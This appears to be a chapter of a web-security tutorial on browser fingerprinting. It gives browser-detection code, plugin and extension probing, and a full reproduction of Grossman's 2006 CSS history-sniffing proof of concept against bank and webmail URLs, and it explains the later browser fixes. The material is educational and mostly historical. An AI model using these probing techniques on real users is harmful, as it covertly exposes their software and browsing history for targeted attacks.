# 08 - Browser Fingerprinting and Detection

## Why It Matters for Security

Attackers use browser detection to deliver targeted exploits. Knowing the exact browser and OS version lets them choose the right payload — an IE6 exploit won't work on Firefox, and vice versa.

## Reading the User-Agent String

```javascript
alert(navigator.userAgent);
```

Example output:

```
Mozilla/5.0 (Windows NT 5.1; rv:1.9.2.7) Gecko/20100713 Firefox/3.6.7
```

From this we can extract:
- OS: Windows NT 5.1 (Windows XP)
- Browser: Firefox 3.6.7
- Language: zh-CN (Simplified Chinese)

But `userAgent` is easily spoofed. Attackers (and defenders) use feature detection for more reliable identification.

## Feature-Based Browser Detection

### Verbose Version: Nested Feature Checks

```javascript
if (window.ActiveXObject) {
  // IE 6 or below

  if (document.documentElement &&
      typeof document.documentElement.style.maxHeight != "undefined") {
    // IE 7+

    if (typeof document.adoptNode != "undefined") {
      // IE 8 (also matches Safari3, FF, Opera, Chrome — but
      // we're inside the ActiveXObject branch, so it's IE 8)
    }
    // else: IE 7
  }
  return "msie";
}
else if (typeof window.opera != "undefined") {
  // Opera (exclusive property)
  // window.opera.version() gives exact version
  return "opera";
}
else if (typeof window.netscape != "undefined") {
  // Mozilla/Firefox (exclusive property)

  if (typeof window.Iterator != "undefined") {
    // Firefox 2+

    if (typeof document.styleSheetSets != "undefined") {
      // Firefox 3
    }
  }
  return "mozilla";
}
else {
  try {
    if (typeof external.AddSearchProvider != "undefined") {
      // Chrome (also Firefox, but we eliminated FF above)
      return "chrome";
    }
  } catch (e) {
    return "safari";
  }
  return "unknown";
}
```

This works by checking browser-exclusive objects and properties, narrowing down through nested conditions.

### Compact Version: One-Liner Detection

```javascript
FF  = /a/[-1] == 'a'
FF3 = (function x(){})[-5] == 'x'
FF2 = (function x(){})[-6] == 'x'
IE  = '\v' == 'v'
Saf = /a/.__proto__ == '//'
Chr = /source/.test((/a/.toString + ''))
Op  = /^function \(/.test([].sort)
```

Each line exploits a quirk unique to that browser's JavaScript engine:
- `FF`: Firefox treats regex as array-like, `/a/[-1]` returns `'a'`
- `FF3` / `FF2`: function-to-string indexing differs between versions
- `IE`: IE treats `\v` (vertical tab) as `v` instead of a whitespace character
- `Saf`: Safari's regex prototype stringifies to `//`
- `Chr`: Chrome's function toString includes `"source"`
- `Op`: Opera's native sort function signature starts with `function (`

### Ultra-Compact: Single Expression

```javascript
B = (function x(){})[-5] == 'x' ? 'FF3' :
    (function x(){})[-6] == 'x' ? 'FF2' :
    /a/[-1] == 'a'              ? 'FF'  :
    '\v' == 'v'                 ? 'IE'  :
    /a/.__proto__ == '//'       ? 'Saf' :
    /s/.test(/a/.toString)      ? 'Chr' :
    /^function \(/.test([].sort)? 'Op'  :
    'Unknown'
```

A chained ternary that identifies the browser in one statement.

## IE6 Detection via Conditional Compilation

```javascript
try {
  IE6 = /*@cc_on @_jscript_version <= 5.7 && @_jscript_build < 10000 @*/
} catch(e) {}
```

This uses IE's proprietary conditional compilation (`@cc_on`) — code inside `/*@cc_on ... @*/` is only executed by IE's JScript engine. Other browsers see it as a comment.

## Detecting Browser Plugins and Extensions

### ActiveX Control Detection (IE)

```javascript
try {
  var Obj = new ActiveXObject('XunLeiBHO.ThunderIEHelper');
  // Thunder (迅雷) browser extension is installed
} catch (e) {
  // Control doesn't exist — plugin not installed
}
```

IE's `ActiveXObject` lets you probe for installed ActiveX controls by class name. If the constructor throws, the control isn't registered. Attackers use this to detect specific software (e.g., download managers, security tools) and tailor their attack.

### Firefox Extension Detection via `chrome://` URLs

```javascript
var m = new Image();
m.onload = function() {
  // Extension is installed (image loaded successfully)
};
m.onerror = function() {
  // Extension is not installed
};
m.src = "chrome://flashgot/skin/icon32.png";
```

Firefox extensions expose resources through `chrome://` protocol URLs. By attempting to load a known resource (like an icon), you can determine whether a specific extension is installed. `onload` fires if the resource exists, `onerror` if it doesn't.

This was later restricted in modern Firefox versions for privacy reasons.

### CSS History Sniffing (Visited Link Detection)

```html
<body>
  <a href="#">曾经访问过的</a>
  <a href="notexist">未曾访问过的</a>
</body>
```

Browsers used to style visited links differently (`:visited` pseudo-class), and JavaScript could read the computed style to determine which links a user had visited. This leaked browsing history to any page.

Modern browsers now restrict `:visited` to color-only changes and lie to `getComputedStyle()`, returning the unvisited style regardless — effectively killing this technique.

### Full Example: JavaScript History Thief (Jeremiah Grossman, 2006)

This is the classic proof-of-concept by Jeremiah Grossman (WhiteHat Security) that demonstrated CSS history sniffing at scale:

```javascript
/* Maintain a list of target URLs to check */
var websites = [
  "http://login.yahoo.com/",
  "http://mail.google.com/",
  "http://www.amazon.com/",
  "http://www.bankofamerica.com/",
  "http://www.chase.com/",
  "http://www.citibank.com/",
  "http://www.ebay.com/",
  "http://www.paypal.com/",
  "http://www.wellsfargo.com/",
  // ... thousands of URLs can be tested in seconds
];

for (var i = 0; i < websites.length; i++) {

  /* Create an anchor tag for each URL */
  var link = document.createElement("a");
  link.id = "id" + i;
  link.href = websites[i];
  link.innerHTML = websites[i];

  /* Inject a per-link style: visited links turn red */
  document.write('<style>');
  document.write('#id' + i + ':visited {color: #FF0000;}');
  document.write('</style>');

  /* Briefly add the link to the DOM, read its computed color, then remove it */
  document.body.appendChild(link);
  var color =
    document.defaultView.getComputedStyle(link, null).getPropertyValue("color");
  document.body.removeChild(link);

  /* If computed color is red, the browser has visited this URL */
  if (color == "rgb(255, 0, 0)") {
    var item = document.createElement('li');
    item.appendChild(link);
    document.getElementById('visited').appendChild(item);
  } else {
    var item = document.createElement('li');
    item.appendChild(link);
    document.getElementById('notvisited').appendChild(item);
  }
}
```

The attack flow:
1. Create a hidden link for each target URL
2. Apply a CSS rule that colors `:visited` links red
3. Add the link to the DOM just long enough to read `getComputedStyle()`
4. If the computed color is red → the user has visited that URL
5. Remove the link — the user sees nothing

This could silently probe thousands of URLs in seconds, revealing which banks, email providers, and social networks the victim uses. The original PoC included banks (Chase, Citibank, Wells Fargo, PayPal), webmail (Yahoo, Google), and social sites — giving attackers a profile for targeted phishing.

This attack directly led to browser vendors restricting `:visited` styling and making `getComputedStyle()` always return the unvisited color.

## Security Implications

- Attackers fingerprint browsers to serve version-specific exploits (e.g., IE6 heap spray vs Firefox use-after-free)
- Browser detection can be used defensively to warn users on vulnerable browsers
- These quirk-based detections are mostly historical (IE6-8, FF2-3 era) but the technique of feature detection remains relevant
- Modern fingerprinting uses canvas, WebGL, audio context, and other APIs for more granular identification
